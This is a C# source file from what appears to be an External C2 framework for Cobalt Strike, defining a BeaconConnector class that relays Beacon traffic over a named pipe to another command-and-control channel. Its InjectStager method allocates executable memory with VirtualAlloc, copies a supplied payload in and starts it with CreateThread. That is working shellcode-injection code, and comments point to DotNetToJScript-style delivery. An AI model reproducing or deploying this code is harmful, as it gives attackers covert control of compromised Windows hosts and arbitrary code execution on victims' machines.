using System;
using System.Runtime.InteropServices;
using ExternalC2.Channels;
using ExternalC2.Interfaces;

namespace ExternalC2.Connectors
{
    /// <summary>
    ///     Base Beacon C2 Connector for integrating the BeaconChannel with another IC2Channel implementation
    /// </summary>
    [ComVisible(true)]
    public abstract class BeaconConnector : BaseConnector
    {
        private const uint PAYLOAD_MAX_SIZE = 512 * 1024;
        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        
        /// <summary>
        ///     Public default constructor for DotNetToJScript and Unit Tests
        /// </summary>
        protected BeaconConnector()
        {
        }
        
        /// <summary>
        ///     Creates a new BeaconConnector using the pipeName for the BeaconChannel and the supplied IC2Channel for the
        ///     ServerChannel
        /// </summary>
        /// <param name="pipeName"></param>
        /// <param name="serverChannel"></param>
        protected BeaconConnector(Guid pipeName, IC2Channel serverChannel)
            : base(new BeaconChannel(pipeName), serverChannel)
        {
        }
        
        /// <summary>
        ///     Creates a new BeaconConnector using the supplied IC2Channel for the ServerChannel. The BeaconChannel PipeName will
        ///     need to be manually set with SetPipeName()
        /// </summary>
        /// <param name="serverChannel"></param>
        protected BeaconConnector(IC2Channel serverChannel)
            : base(new BeaconChannel(), serverChannel)
        {
        }

        /// <summary>
        ///     The Cobalt Strike Beacon ID extracted from initial pipe->server frame
        /// </summary>
        public int ExternalBeaconId => ((BeaconChannel) BeaconChannel).ExternalId;

        /// <summary>
        ///     Injects the supplied payload into the current process and executes it in a new thread
        /// </summary>
        /// <param name="payload"></param>
        /// <returns>The Thread ID for the created thread</returns>
        public uint InjectStager(byte[] payload)
        {
            uint threadId = 0;
            IntPtr addr = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(payload, 0, addr, payload.Length);
            CreateThread(0, 0, addr, IntPtr.Zero, 0, ref threadId);

            return threadId;
        }

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId
        );

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            uint lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect
        );
    }
}